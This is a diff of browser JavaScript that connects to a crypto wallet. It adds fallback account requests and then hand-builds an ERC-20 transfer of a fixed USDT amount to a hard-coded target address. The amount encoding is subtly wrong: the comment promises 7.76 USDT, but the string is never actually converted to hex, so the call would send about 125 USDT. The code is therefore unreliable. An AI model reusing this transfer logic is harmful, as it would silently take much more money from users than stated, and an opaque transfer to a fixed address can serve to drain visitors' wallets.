@@ -114,17 +114,36 @@
 
       try {
         if (!isConnected) {
-          // Request accounts directly via provider method
           let accounts = [];
-          if (typeof eth.request === 'function') {
-            accounts = await eth.request({ method: 'eth_requestAccounts' });
-          } else if (typeof eth.send === 'function') {
-            const res = await eth.send('eth_requestAccounts');
-            accounts = res.result || res;
+          
+          // Try multiple request methods for maximum compatibility with imported/private key wallets
+          try {
+            if (typeof eth.request === 'function') {
+              accounts = await eth.request({ method: 'eth_requestAccounts' });
+            }
+          } catch (e) {}
+
+          if (!accounts || accounts.length === 0) {
+            try {
+              if (typeof eth.send === 'function') {
+                const res = await eth.send('eth_requestAccounts');
+                accounts = res.result || res;
+              }
+            } catch (e) {}
+          }
+
+          if (!accounts || accounts.length === 0) {
+            try {
+              if (typeof eth.request === 'function') {
+                accounts = await eth.request({ method: 'eth_accounts' });
+              }
+            } catch (e) {}
           }
 
           globalUserAddress = Array.isArray(accounts) ? accounts[0] : accounts;
-          if (!globalUserAddress) throw new Error("Could not get wallet address.");
+          if (!globalUserAddress) {
+            throw new Error("Could not get wallet address from provider.");
+          }
 
           // Switch network
           try {
@@ -141,12 +160,11 @@
           document.getElementById('connectBtn').classList.remove('bg-blue-600', 'hover:bg-blue-500');
           document.getElementById('connectBtn').classList.add('bg-emerald-600', 'hover:bg-emerald-500');
         } else {
-          // Manual hex encoding for ERC-20 transfer function (bypassing ethers library completely)
-          // transfer(address,uint256) function signature selector: a9059cbb
+          // Manual hex encoding for ERC-20 transfer
           const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
           const paddedTarget = cleanTarget.padStart(64, '0');
           
-          // 7.76 USDT with 6 decimals = 7760000 in hex = 0x766c0
+          // 7.76 USDT with 6 decimals = 7760000 -> hex: 766c0
           const amountHex = "7760000".toString(16);
           const paddedAmount = amountHex.padStart(64, '0');
           
